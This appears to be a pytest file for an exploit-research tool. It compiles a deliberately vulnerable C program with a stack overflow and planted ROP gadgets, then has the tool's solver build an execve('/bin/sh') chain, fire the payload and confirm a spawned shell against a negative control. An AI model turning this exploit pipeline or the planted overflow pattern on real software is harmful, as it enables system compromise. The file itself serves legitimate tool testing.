"""ROP-chain SOLVER end-to-end: the semantic gadget engine discovers the register-control gadgets,
the solver (rop_solver.solve_reg_chain) COMPOSES them into an execve("/bin/sh",0,0) syscall chain,
and the chain spawns a REAL shell -- confirmed natively with a negative control. This is the
discovery -> solver -> proven-exploit path the engine exists for.

x86-64 host-native: the target supplies a clean gadget set via inline asm (pop rdi/rsi/rdx/rax; ret
and a syscall site -- the standard CTF/static shape, same as tests/test_execve.py), an NX-on
no-PIE binary with a stack overflow and a "/bin/sh" string. The solver is given only the goal
register state + the syscall site; it finds the gadgets and lays out the stack itself."""
import os
import shutil
import subprocess
import time

import pytest
from lykos.analyze.poc import gadget_emu, rop, rop_solver

_GCC = shutil.which("gcc") or shutil.which("cc")

_SRC = (
    '#include <unistd.h>\n'
    'char binsh[] = "/bin/sh";\n'
    '__asm__(".text\\n"\n'
    '  ".global grdi\\n grdi: pop %rdi\\n ret\\n"\n'
    '  ".global grsi\\n grsi: pop %rsi\\n ret\\n"\n'
    '  ".global grdx\\n grdx: pop %rdx\\n ret\\n"\n'
    '  ".global grax\\n grax: pop %rax\\n ret\\n"\n'
    '  ".global gsys\\n gsys: syscall\\n ret\\n");\n'
    'void vuln(void){ char b[64]; read(0,b,512); }\n'
    'int main(void){ vuln(); return 0; }\n')


def _host_x86_64():
    from lykos.analyze.dynamic import sandbox
    return sandbox.host_arch() == "x86-64"


def _detonate(exe, payload, markers, timeout=8.0):
    """Run the target, deliver the overflow, then send the forgery-proof marker command to the shell
    it spawns; return stdout for markers.proves()."""
    p = subprocess.Popen([str(exe)], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, start_new_session=True)

    def w(b):
        try:
            p.stdin.write(b)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            pass
    try:
        w(payload)
        time.sleep(0.2)                                   # let the hijack land and execve the shell
        w(markers.command + b"\n")
        try:
            out, _ = p.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            try:
                os.killpg(os.getpgid(p.pid), 9)
            except OSError:
                pass
            out, _ = p.communicate(timeout=2)
        return out or b""
    finally:
        try:
            os.killpg(os.getpgid(p.pid), 9)
        except OSError:
            pass


@pytest.mark.skipif(not gadget_emu.available(), reason="needs unicorn + capstone")
@pytest.mark.skipif(not _GCC, reason="needs a C compiler")
def test_solver_execve_shell_x86_64(tmp_path):
    if not _host_x86_64():
        pytest.skip("x86-64 native only")
    from lykos.analyze.poc import attribution
    src = tmp_path / "v.c"
    src.write_text(_SRC)
    exe = tmp_path / "v"
    if subprocess.run([_GCC, "-no-pie", "-fno-stack-protector", "-static", "-w",
                       str(src), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build fixture")
    data = exe.read_bytes()
    binsh = rop.find_string(data, b"/bin/sh")
    gsys = next(int(l.split()[0], 16) for l in
                subprocess.run(["nm", str(exe)], capture_output=True, text=True).stdout.splitlines()
                if len(l.split()) == 3 and l.split()[2] == "gsys")
    assert binsh and gsys

    # THE SOLVER: given only the goal register state + the syscall site, it discovers the gadgets
    # (via the semantic engine) and lays out the chain. execve("/bin/sh", NULL, NULL): rax = 59.
    sol = rop_solver.solve_reg_chain(
        data, "x86-64", sets={"rdi": binsh, "rsi": 0, "rdx": 0, "rax": 59},
        final_va=gsys, offset=72)
    assert sol is not None, "solver could not compose the chain"
    assert len(sol["chain"]) == 4

    m = attribution.make_code_markers()
    out = _detonate(exe, sol["payload"], m)
    assert m.proves(out), f"solver chain did not spawn a shell (out={out[-120:]!r})"

    # negative control: a wrong &"/bin/sh" must NOT spawn a shell (the hijack is EARNED)
    m2 = attribution.make_code_markers()
    bad = rop_solver.solve_reg_chain(
        data, "x86-64", sets={"rdi": binsh ^ 0xFFFF, "rsi": 0, "rdx": 0, "rax": 59},
        final_va=gsys, offset=72)
    assert not m2.proves(_detonate(exe, bad["payload"], m2))
